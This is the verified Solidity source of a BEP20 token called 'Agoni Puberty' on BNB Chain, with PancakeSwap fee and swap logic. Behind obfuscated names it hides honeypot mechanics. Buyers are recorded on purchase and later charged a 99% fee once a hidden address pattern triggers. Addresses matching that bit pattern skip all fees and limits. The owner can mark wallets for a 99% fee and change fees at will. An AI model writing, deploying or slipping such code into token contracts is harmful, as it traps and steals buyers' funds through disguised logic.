/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AgoniPuberty is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Agoni Puberty ";
    string constant _symbol = "AgoniPuberty";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private burnBuyExemptFeeLiquiditySellIs;
    mapping(address => bool) private autoWalletIsMode;
    mapping(address => bool) private modeTradingMaxSellWallet;
    mapping(address => bool) private walletIsBuyTeamTxSell;
    mapping(address => uint256) private maxExemptIsTeam;
    mapping(uint256 => address) private sellExemptBuyTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txLaunchedIsFee = 0;
    uint256 private tradingBuyIsSwapBurnTx = 6;

    //SELL FEES
    uint256 private tradingLiquidityReceiverFee = 0;
    uint256 private botsReceiverIsMode = 6;

    uint256 private swapBotsTeamMarketingReceiverWallet = tradingBuyIsSwapBurnTx + txLaunchedIsFee;
    uint256 private teamTxSwapWalletSell = 100;

    address private botsLaunchedAutoLiquidity = (msg.sender); // auto-liq address
    address private swapTradingModeReceiver = (0x2964dD65C24F6566BA25954cFFFFC6FFf6A96f03); // marketing address
    address private buyIsAutoLaunched = DEAD;
    address private modeAutoMarketingTradingExemptBotsBuy = DEAD;
    address private modeSwapMaxFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minMarketingTradingMode;
    uint256 private isModeMinTeamSell;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private autoBotsFeeSell;
    uint256 private sellReceiverFeeAuto;
    uint256 private autoWalletBurnMin;
    uint256 private burnTxLaunchedTrading;
    uint256 private tradingMaxReceiverLaunchedBots;

    bool private feeMaxModeMarketingTxReceiverBurn = true;
    bool private walletIsBuyTeamTxSellMode = true;
    bool private isSwapAutoModeBurn = true;
    bool private feeWalletSellAuto = true;
    bool private txMinBotsLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private feeBuySwapReceiver = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        autoBotsFeeSell = true;

        burnBuyExemptFeeLiquiditySellIs[msg.sender] = true;
        burnBuyExemptFeeLiquiditySellIs[address(this)] = true;

        autoWalletIsMode[msg.sender] = true;
        autoWalletIsMode[0x0000000000000000000000000000000000000000] = true;
        autoWalletIsMode[0x000000000000000000000000000000000000dEaD] = true;
        autoWalletIsMode[address(this)] = true;

        modeTradingMaxSellWallet[msg.sender] = true;
        modeTradingMaxSellWallet[0x0000000000000000000000000000000000000000] = true;
        modeTradingMaxSellWallet[0x000000000000000000000000000000000000dEaD] = true;
        modeTradingMaxSellWallet[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return buyMarketingExemptSell(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return buyMarketingExemptSell(sender, recipient, amount);
    }

    function buyMarketingExemptSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = launchedReceiverTradingBuyLimitSellMax(sender) || launchedReceiverTradingBuyLimitSellMax(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                swapTeamLiquidityBots();
            }
            if (!bLimitTxWalletValue) {
                swapReceiverModeSellTeam(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return receiverLimitSellWallet(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(feeMaxModeMarketingTxReceiverBurn, "Trading is not active");
        }

        if (!Administration[sender] && !burnBuyExemptFeeLiquiditySellIs[sender] && !burnBuyExemptFeeLiquiditySellIs[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || modeTradingMaxSellWallet[sender] || modeTradingMaxSellWallet[recipient], "Max TX Limit has been triggered");

        if (liquidityBuyModeWallet()) {launchedMinTradingBuyExempt();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = txModeMaxWalletBots(sender) ? botsTradingFeeIsLaunched(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function receiverLimitSellWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txModeMaxWalletBots(address sender) internal view returns (bool) {
        return !autoWalletIsMode[sender];
    }

    function teamBotsAutoWallet(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            swapBotsTeamMarketingReceiverWallet = botsReceiverIsMode + tradingLiquidityReceiverFee;
            return receiverBotsExemptMin(sender, swapBotsTeamMarketingReceiverWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            swapBotsTeamMarketingReceiverWallet = tradingBuyIsSwapBurnTx + txLaunchedIsFee;
            return swapBotsTeamMarketingReceiverWallet;
        }
        return receiverBotsExemptMin(sender, swapBotsTeamMarketingReceiverWallet);
    }

    function botsTradingFeeIsLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(teamBotsAutoWallet(sender, receiver == uniswapV2Pair)).div(teamTxSwapWalletSell);

        if (walletIsBuyTeamTxSell[sender] || walletIsBuyTeamTxSell[receiver]) {
            feeAmount = amount.mul(99).div(teamTxSwapWalletSell);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedReceiverTradingBuyLimitSellMax(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function receiverBotsExemptMin(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = maxExemptIsTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function swapReceiverModeSellTeam(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        sellExemptBuyTx[exemptLimitValue] = addr;
    }

    function swapTeamLiquidityBots() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (maxExemptIsTeam[sellExemptBuyTx[i]] == 0) {
                    maxExemptIsTeam[sellExemptBuyTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(swapTradingModeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityBuyModeWallet() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    txMinBotsLaunched &&
    _balances[address(this)] >= feeBuySwapReceiver;
    }

    function launchedMinTradingBuyExempt() internal swapping {
        uint256 amountToLiquify = feeBuySwapReceiver.mul(txLaunchedIsFee).div(swapBotsTeamMarketingReceiverWallet).div(2);
        uint256 amountToSwap = feeBuySwapReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = swapBotsTeamMarketingReceiverWallet.sub(txLaunchedIsFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txLaunchedIsFee).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(tradingBuyIsSwapBurnTx).div(totalETHFee);

        payable(swapTradingModeReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsLaunchedAutoLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getModeTradingMaxSellWallet(address a0) public view returns (bool) {
        if (modeTradingMaxSellWallet[a0] == walletIsBuyTeamTxSell[a0]) {
            return isSwapAutoModeBurn;
        }
        if (a0 == modeAutoMarketingTradingExemptBotsBuy) {
            return feeMaxModeMarketingTxReceiverBurn;
        }
            return modeTradingMaxSellWallet[a0];
    }
    function setModeTradingMaxSellWallet(address a0,bool a1) public onlyOwner {
        if (a0 != modeAutoMarketingTradingExemptBotsBuy) {
            txMinBotsLaunched=a1;
        }
        if (modeTradingMaxSellWallet[a0] == autoWalletIsMode[a0]) {
           autoWalletIsMode[a0]=a1;
        }
        modeTradingMaxSellWallet[a0]=a1;
    }

    function getTradingLiquidityReceiverFee() public view returns (uint256) {
        if (tradingLiquidityReceiverFee != teamTxSwapWalletSell) {
            return teamTxSwapWalletSell;
        }
        if (tradingLiquidityReceiverFee == tradingLiquidityReceiverFee) {
            return tradingLiquidityReceiverFee;
        }
        if (tradingLiquidityReceiverFee != feeBuySwapReceiver) {
            return feeBuySwapReceiver;
        }
        return tradingLiquidityReceiverFee;
    }
    function setTradingLiquidityReceiverFee(uint256 a0) public onlyOwner {
        if (tradingLiquidityReceiverFee != tradingBuyIsSwapBurnTx) {
            tradingBuyIsSwapBurnTx=a0;
        }
        if (tradingLiquidityReceiverFee != txLaunchedIsFee) {
            txLaunchedIsFee=a0;
        }
        tradingLiquidityReceiverFee=a0;
    }

    function getModeAutoMarketingTradingExemptBotsBuy() public view returns (address) {
        if (modeAutoMarketingTradingExemptBotsBuy != swapTradingModeReceiver) {
            return swapTradingModeReceiver;
        }
        return modeAutoMarketingTradingExemptBotsBuy;
    }
    function setModeAutoMarketingTradingExemptBotsBuy(address a0) public onlyOwner {
        if (modeAutoMarketingTradingExemptBotsBuy != modeAutoMarketingTradingExemptBotsBuy) {
            modeAutoMarketingTradingExemptBotsBuy=a0;
        }
        modeAutoMarketingTradingExemptBotsBuy=a0;
    }

    function getTradingBuyIsSwapBurnTx() public view returns (uint256) {
        return tradingBuyIsSwapBurnTx;
    }
    function setTradingBuyIsSwapBurnTx(uint256 a0) public onlyOwner {
        tradingBuyIsSwapBurnTx=a0;
    }

    function getBotsReceiverIsMode() public view returns (uint256) {
        return botsReceiverIsMode;
    }
    function setBotsReceiverIsMode(uint256 a0) public onlyOwner {
        botsReceiverIsMode=a0;
    }

    function getTxMinBotsLaunched() public view returns (bool) {
        return txMinBotsLaunched;
    }
    function setTxMinBotsLaunched(bool a0) public onlyOwner {
        if (txMinBotsLaunched != walletIsBuyTeamTxSellMode) {
            walletIsBuyTeamTxSellMode=a0;
        }
        if (txMinBotsLaunched == isSwapAutoModeBurn) {
            isSwapAutoModeBurn=a0;
        }
        txMinBotsLaunched=a0;
    }

    function getWalletIsBuyTeamTxSell(address a0) public view returns (bool) {
        if (a0 != modeSwapMaxFee) {
            return txMinBotsLaunched;
        }
        if (a0 == buyIsAutoLaunched) {
            return walletIsBuyTeamTxSellMode;
        }
        if (a0 != botsLaunchedAutoLiquidity) {
            return walletIsBuyTeamTxSellMode;
        }
            return walletIsBuyTeamTxSell[a0];
    }
    function setWalletIsBuyTeamTxSell(address a0,bool a1) public onlyOwner {
        if (walletIsBuyTeamTxSell[a0] == walletIsBuyTeamTxSell[a0]) {
           walletIsBuyTeamTxSell[a0]=a1;
        }
        walletIsBuyTeamTxSell[a0]=a1;
    }

    function getModeSwapMaxFee() public view returns (address) {
        if (modeSwapMaxFee != modeSwapMaxFee) {
            return modeSwapMaxFee;
        }
        if (modeSwapMaxFee == buyIsAutoLaunched) {
            return buyIsAutoLaunched;
        }
        return modeSwapMaxFee;
    }
    function setModeSwapMaxFee(address a0) public onlyOwner {
        modeSwapMaxFee=a0;
    }

    function getFeeBuySwapReceiver() public view returns (uint256) {
        if (feeBuySwapReceiver != teamTxSwapWalletSell) {
            return teamTxSwapWalletSell;
        }
        if (feeBuySwapReceiver != tradingBuyIsSwapBurnTx) {
            return tradingBuyIsSwapBurnTx;
        }
        return feeBuySwapReceiver;
    }
    function setFeeBuySwapReceiver(uint256 a0) public onlyOwner {
        feeBuySwapReceiver=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}